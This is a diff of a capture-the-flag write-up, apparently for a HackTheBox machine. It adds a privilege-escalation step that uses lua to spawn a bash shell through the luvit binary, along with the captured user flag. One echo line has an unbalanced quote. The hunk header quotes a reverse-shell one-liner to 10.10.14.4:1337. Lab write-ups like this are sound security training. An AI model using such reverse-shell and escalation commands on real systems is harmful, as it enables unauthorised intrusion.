@@ -120,3 +120,32 @@ bash -c 'bash -i >& /dev/tcp/10.10.14.4/1337 0>&1'
 19. Hence, there is a chance the other files are done the same. Now we're targeting the **.ssh** key.
 20. Remembering we can specify a username, hence introducing 2 methods can be done to gain access to sysadmin's home directory.
 21. The first method is using the **luvit** binary, the second method is by generating the ssh-keys.
+
+### 1st Method
+
+- Sending shell spawn LOCs to lua.
+
+```
+echo "require('os');" > sysad.lua
+echo "os.execute('/bin/bash'); > sysad.lua
+```
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/b472f3aa-ca88-4f55-93a5-b44f419c6402)
+
+
+> GETTING USER FLAG
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/54a0f835-d4c9-4fda-a9d1-840b85d5aa60)
+
+
+## USER FLAG
+
+```
+4835038ff249e1ae23de765fc1110e3d
+```
+
+## IMPORTANT LINKS
+
+```
+
+```
